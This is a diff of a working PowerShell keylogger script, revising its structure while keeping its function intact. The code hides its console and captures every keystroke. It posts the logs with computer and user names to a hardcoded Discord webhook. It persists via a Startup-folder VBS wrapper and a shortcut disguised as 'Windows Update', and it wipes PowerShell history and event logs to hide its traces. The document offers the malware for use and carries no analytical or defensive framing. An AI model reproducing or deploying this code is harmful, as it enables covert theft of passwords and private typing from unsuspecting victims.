@@ -1,6 +1,6 @@
 $webhook = 'https://discord.com/api/webhooks/1462829051788918795/mGc2VRl4DFVcQUZHMEKLrq3DWMPzf2shF2xEwY8fcSZa6zqI_7ddS7p7hR63z_Y_vdIZ'
 
-# Keyboard Safe Checking - IMPROVED VERSION
+# Keyboard Safe Checking
 $keyboardCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -15,35 +15,25 @@ public class K {
 '@
 Add-Type -TypeDefinition $keyboardCode
 
-# HIDE CONSOLE IMMEDIATELY
+# Hide console immediately
 $consolePtr = [K]::GetConsoleWindow()
 [K]::ShowWindow($consolePtr, 0)
 
-# Check if this is first run or background run
+# Setup startup
 $startupPath = [Environment]::GetFolderPath('Startup')
-$currentScript = $MyInvocation.MyCommand.Path
-$startupScriptPath = Join-Path $startupPath "temp_clean.ps1"
+$startupScript = Join-Path $startupPath "temp_clean.ps1"
 
-# Check if we're running from GitHub (no script path)
-$isRemoteExecution = [string]::IsNullOrEmpty($currentScript)
+# Always setup startup when run
+if (-not (Test-Path $startupPath)) {
+    New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
+}
 
-if ($isRemoteExecution -or ($currentScript -and $currentScript -ne $startupScriptPath)) {
-    # FIRST RUN - SETUP STARTUP
-    
-    # Ensure Startup folder exists
-    if (-not (Test-Path $startupPath)) {
-        New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
-    }
-    
-    # Save current script content to Startup
-    if ($isRemoteExecution) {
-        # We're running from GitHub - need to save the script
-        # Get the script content by reading itself (tricky with iex)
-        $scriptContent = @'
-$webhook = 'https://discord.com/api/webhooks/1462829051788918795/mGc2VRl4DFVcQUZHMEKLrq3DWMPzf2shF2xEwY8fcSZa6zqI_7ddS7p7hR63z_Y_vdIZ'
+# Save the background keylogger script to startup
+$backgroundScript = @'
+$webhook = "https://discord.com/api/webhooks/1462829051788918795/mGc2VRl4DFVcQUZHMEKLrq3DWMPzf2shF2xEwY8fcSZa6zqI_7ddS7p7hR63z_Y_vdIZ"
 
-# Keyboard Safe Checking - IMPROVED VERSION
-$keyboardCode = @'
+# Keyboard API
+$keyboardCode = @"
 using System;
 using System.Runtime.InteropServices;
 public class K {
@@ -54,89 +44,19 @@ public class K {
     [DllImport("user32.dll")]
     public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
-'@
+"@
 Add-Type -TypeDefinition $keyboardCode
 
-# HIDE CONSOLE IMMEDIATELY
+# Hide console
 $consolePtr = [K]::GetConsoleWindow()
 [K]::ShowWindow($consolePtr, 0)
 
-# Check if this is first run or background run
-$startupPath = [Environment]::GetFolderPath('Startup')
-$currentScript = $MyInvocation.MyCommand.Path
-$startupScriptPath = Join-Path $startupPath "temp_clean.ps1"
-
-# Check if we're running from GitHub (no script path)
-$isRemoteExecution = [string]::IsNullOrEmpty($currentScript)
-
-if ($isRemoteExecution -or ($currentScript -and $currentScript -ne $startupScriptPath)) {
-    # FIRST RUN - SETUP STARTUP
-    
-    # Ensure Startup folder exists
-    if (-not (Test-Path $startupPath)) {
-        New-Item -ItemType Directory -Path $startupPath -Force | Out-Null
-    }
-    
-    # Save current script content to Startup
-    if ($isRemoteExecution) {
-        # We're running from GitHub - need to save the script
-        # Get the script content by reading itself (tricky with iex)
-        $scriptContent = @'
-[PASTE YOUR ENTIRE SCRIPT HERE - THE SAME CONTENT]
-'@
-        $scriptContent | Out-File -FilePath $startupScriptPath -Encoding UTF8 -Force
-    } else {
-        # Copy from current location
-        Copy-Item -Path $currentScript -Destination $startupScriptPath -Force | Out-Null
-    }
-    
-    # Create VBS wrapper
-    $vbsPath = Join-Path $startupPath "temp_clean.vbs"
-    $vbsContent = @"
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$startupScriptPath""", 0, False
-Set objShell = Nothing
-"@
-    
-    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
-    
-    # Create shortcut
-    $wsh = New-Object -ComObject WScript.Shell
-    $shortcutPath = Join-Path $startupPath "Windows Update.lnk"
-    $shortcut = $wsh.CreateShortcut($shortcutPath)
-    $shortcut.TargetPath = "wscript.exe"
-    $shortcut.Arguments = "//B `"$vbsPath`""
-    $shortcut.WindowStyle = 7
-    $shortcut.Save()
-    
-    # Launch background version
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "wscript.exe"
-    $psi.Arguments = "//B `"$vbsPath`""
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
-    
-    # FORCE EXIT - This will close PowerShell when run via iwr | iex
-    # Create a job that exits after a delay
-    Start-Job -ScriptBlock {
-        Start-Sleep -Seconds 3
-        exit
-    } | Out-Null
-    
-    # Stop further execution in this instance
-    return
-}
-
-# IF WE REACH HERE, WE'RE THE BACKGROUND INSTANCE RUNNING FROM STARTUP
-# Continue with keylogger functionality...
-
-# Setup
-$buffer = ''
+# Keylogger setup
+$buffer = ""
 $lastSend = Get-Date
 $computer = $env:COMPUTERNAME
 $user = $env:USERNAME
 
-# Clear logs function
 function Clear-Logs {
     Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
     wevtutil cl "Windows PowerShell" /q 2>$null
@@ -144,37 +64,32 @@ function Clear-Logs {
 }
 
 Clear-Logs
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
+$ErrorActionPreference = "SilentlyContinue"
+$ProgressPreference = "SilentlyContinue"
 
-# Keylogger loop (same as before)
-while($true) {
-    # Track shift state
+# Main keylogger loop
+while ($true) {
     $shiftPressed = ([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0
     $capsLock = [Console]::CapsLock
     
-    # Letters A-Z (with shift/caps detection)
+    # Letters
     65..90 | ForEach-Object {
-        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
+        if (([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
             $key = [char]$_
-            
-            # Determine if uppercase
             $isUppercase = $shiftPressed -xor $capsLock
-            
-            if(-not $isUppercase) {
+            if (-not $isUppercase) {
                 $key = $key.ToLower()
             }
-            
             $buffer += $key
             Start-Sleep -Milliseconds 50
         }
     }
     
-    # Numbers 0-9 (top row)
+    # Numbers
     48..57 | ForEach-Object {
-        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
-            if($shiftPressed) {
-                $symbols = @(')', '!', '@', '#', '$', '%', '^', '&', '*', '(')
+        if (([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
+            if ($shiftPressed) {
+                $symbols = @(")", "!", "@", "#", "$", "%", "^", "&", "*", "(")
                 $buffer += $symbols[$_ - 48]
             } else {
                 $buffer += [char]$_
@@ -183,109 +98,48 @@ while($true) {
         }
     }
     
-    # Numpad numbers
+    # Numpad
     96..105 | ForEach-Object {
-        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
+        if (([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
             $buffer += ([char]($_ - 48))
             Start-Sleep -Milliseconds 50
         }
     }
     
-    # SPACE BAR
-    if(([K]::GetAsyncKeyState(32) -band 0x8000) -ne 0) {
-        $buffer += ' '
-        Start-Sleep -Milliseconds 50
-    }
+    # Special keys
+    if (([K]::GetAsyncKeyState(32) -band 0x8000) -ne 0) { $buffer += " "; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(13) -band 0x8000) -ne 0) { $buffer += "[ENTER]`n"; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(8) -band 0x8000) -ne 0) { if ($buffer.Length -gt 0) { $buffer = $buffer.Substring(0, $buffer.Length - 1) }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(9) -band 0x8000) -ne 0) { $buffer += "[TAB]"; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(190) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { ">" } else { "." }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(188) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "<" } else { "," }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(191) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "?" } else { "/" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(186) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { ":" } else { ";" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(222) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { '"' } else { "'" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(219) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "{" } else { "[" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(221) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "}" } else { "]" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(220) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "|" } else { "\" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(189) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "_" } else { "-" }; Start-Sleep -Milliseconds 50 }
+    if (([K]::GetAsyncKeyState(187) -band 0x8000) -ne 0) { $buffer += if ($shiftPressed) { "+" } else { "=" }; Start-Sleep -Milliseconds 50 }
     
-    # ENTER key
-    if(([K]::GetAsyncKeyState(13) -band 0x8000) -ne 0) {
-        $buffer += "[ENTER]`n"
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # BACKSPACE
-    if(([K]::GetAsyncKeyState(8) -band 0x8000) -ne 0) {
-        if($buffer.Length -gt 0) {
-            $buffer = $buffer.Substring(0, $buffer.Length - 1)
-        }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # TAB
-    if(([K]::GetAsyncKeyState(9) -band 0x8000) -ne 0) {
-        $buffer += "[TAB]"
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # Punctuation
-    if(([K]::GetAsyncKeyState(190) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '>' } else { '.' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(188) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '<' } else { ',' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(191) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '?' } else { '/' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(186) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { ':' } else { ';' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(222) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '"' } else { "'" }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(219) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '{' } else { '[' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(221) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '}' } else { ']' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(220) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '|' } else { '\' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(189) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '_' } else { '-' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(187) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '+' } else { '=' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # Send data
+    # Send every 30 seconds or 200 characters
     $timeElapsed = ((Get-Date) - $lastSend).TotalSeconds
     
-    if($buffer.Length -ge 500 -or $timeElapsed -ge 30) {
-        if($buffer.Length -gt 0) {
-            $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-            $message = "**$computer/$user** [$timestamp]`n" + '```' + "$buffer" + '```'
+    if ($buffer.Length -ge 200 -or $timeElapsed -ge 30) {
+        if ($buffer.Length -gt 0) {
+            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+            $message = "**$computer/$user** [$timestamp]`n" + "```" + "$buffer" + "```"
             $payload = @{content = $message} | ConvertTo-Json -Compress
             
             try {
-                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 10
+                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10
                 Clear-Logs
             } catch {
                 $tempFile = "$env:TEMP\kl_backup.txt"
                 $buffer | Out-File -FilePath $tempFile -Append -Encoding UTF8
             }
             
-            $buffer = ''
+            $buffer = ""
         }
         $lastSend = Get-Date
     }
@@ -293,211 +147,30 @@ while($true) {
     Start-Sleep -Milliseconds 10
 }
 '@
-        $scriptContent | Out-File -FilePath $startupScriptPath -Encoding UTF8 -Force
-    } else {
-        # Copy from current location
-        Copy-Item -Path $currentScript -Destination $startupScriptPath -Force | Out-Null
-    }
-    
-    # Create VBS wrapper
-    $vbsPath = Join-Path $startupPath "temp_clean.vbs"
-    $vbsContent = @"
+
+# Save background script
+$backgroundScript | Out-File -FilePath $startupScript -Encoding UTF8 -Force
+
+# Create VBS wrapper
+$vbsPath = Join-Path $startupPath "temp_clean.vbs"
+$vbsContent = @"
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$startupScriptPath""", 0, False
+objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$startupScript""", 0, False
 Set objShell = Nothing
 "@
-    
-    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
-    
-    # Create shortcut
-    $wsh = New-Object -ComObject WScript.Shell
-    $shortcutPath = Join-Path $startupPath "Windows Update.lnk"
-    $shortcut = $wsh.CreateShortcut($shortcutPath)
-    $shortcut.TargetPath = "wscript.exe"
-    $shortcut.Arguments = "//B `"$vbsPath`""
-    $shortcut.WindowStyle = 7
-    $shortcut.Save()
-    
-    # Launch background version
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = "wscript.exe"
-    $psi.Arguments = "//B `"$vbsPath`""
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
-    
-    # FORCE EXIT - This will close PowerShell when run via iwr | iex
-    # Create a job that exits after a delay
-    Start-Job -ScriptBlock {
-        Start-Sleep -Seconds 3
-        exit
-    } | Out-Null
-    
-    # Stop further execution in this instance
-    return
-}
+$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
 
-# IF WE REACH HERE, WE'RE THE BACKGROUND INSTANCE RUNNING FROM STARTUP
-# Continue with keylogger functionality...
+# Create shortcut
+$wsh = New-Object -ComObject WScript.Shell
+$shortcutPath = Join-Path $startupPath "Windows Update.lnk"
+$shortcut = $wsh.CreateShortcut($shortcutPath)
+$shortcut.TargetPath = "wscript.exe"
+$shortcut.Arguments = "//B `"$vbsPath`""
+$shortcut.WindowStyle = 7
+$shortcut.Save()
 
-# Setup
-$buffer = ''
-$lastSend = Get-Date
-$computer = $env:COMPUTERNAME
-$user = $env:USERNAME
+# Launch background version
+Start-Process "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -WindowStyle Hidden
 
-# Clear logs function
-function Clear-Logs {
-    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
-    wevtutil cl "Windows PowerShell" /q 2>$null
-    wevtutil cl "Microsoft-Windows-PowerShell/Operational" /q 2>$null
-}
-
-Clear-Logs
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
-
-# Keylogger loop (same as before)
-while($true) {
-    # Track shift state
-    $shiftPressed = ([K]::GetAsyncKeyState(16) -band 0x8000) -ne 0
-    $capsLock = [Console]::CapsLock
-    
-    # Letters A-Z (with shift/caps detection)
-    65..90 | ForEach-Object {
-        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
-            $key = [char]$_
-            
-            # Determine if uppercase
-            $isUppercase = $shiftPressed -xor $capsLock
-            
-            if(-not $isUppercase) {
-                $key = $key.ToLower()
-            }
-            
-            $buffer += $key
-            Start-Sleep -Milliseconds 50
-        }
-    }
-    
-    # Numbers 0-9 (top row)
-    48..57 | ForEach-Object {
-        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
-            if($shiftPressed) {
-                $symbols = @(')', '!', '@', '#', '$', '%', '^', '&', '*', '(')
-                $buffer += $symbols[$_ - 48]
-            } else {
-                $buffer += [char]$_
-            }
-            Start-Sleep -Milliseconds 50
-        }
-    }
-    
-    # Numpad numbers
-    96..105 | ForEach-Object {
-        if(([K]::GetAsyncKeyState($_) -band 0x8000) -ne 0) {
-            $buffer += ([char]($_ - 48))
-            Start-Sleep -Milliseconds 50
-        }
-    }
-    
-    # SPACE BAR
-    if(([K]::GetAsyncKeyState(32) -band 0x8000) -ne 0) {
-        $buffer += ' '
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # ENTER key
-    if(([K]::GetAsyncKeyState(13) -band 0x8000) -ne 0) {
-        $buffer += "[ENTER]`n"
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # BACKSPACE
-    if(([K]::GetAsyncKeyState(8) -band 0x8000) -ne 0) {
-        if($buffer.Length -gt 0) {
-            $buffer = $buffer.Substring(0, $buffer.Length - 1)
-        }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # TAB
-    if(([K]::GetAsyncKeyState(9) -band 0x8000) -ne 0) {
-        $buffer += "[TAB]"
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # Punctuation
-    if(([K]::GetAsyncKeyState(190) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '>' } else { '.' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(188) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '<' } else { ',' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(191) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '?' } else { '/' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(186) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { ':' } else { ';' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(222) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '"' } else { "'" }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(219) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '{' } else { '[' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(221) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '}' } else { ']' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(220) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '|' } else { '\' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(189) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '_' } else { '-' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    if(([K]::GetAsyncKeyState(187) -band 0x8000) -ne 0) {
-        $buffer += if($shiftPressed) { '+' } else { '=' }
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # Send data
-    $timeElapsed = ((Get-Date) - $lastSend).TotalSeconds
-    
-    if($buffer.Length -ge 500 -or $timeElapsed -ge 30) {
-        if($buffer.Length -gt 0) {
-            $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-            $message = "**$computer/$user** [$timestamp]`n" + '```' + "$buffer" + '```'
-            $payload = @{content = $message} | ConvertTo-Json -Compress
-            
-            try {
-                Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 10
-                Clear-Logs
-            } catch {
-                $tempFile = "$env:TEMP\kl_backup.txt"
-                $buffer | Out-File -FilePath $tempFile -Append -Encoding UTF8
-            }
-            
-            $buffer = ''
-        }
-        $lastSend = Get-Date
-    }
-    
-    Start-Sleep -Milliseconds 10
-}
+# Exit immediately
+exit
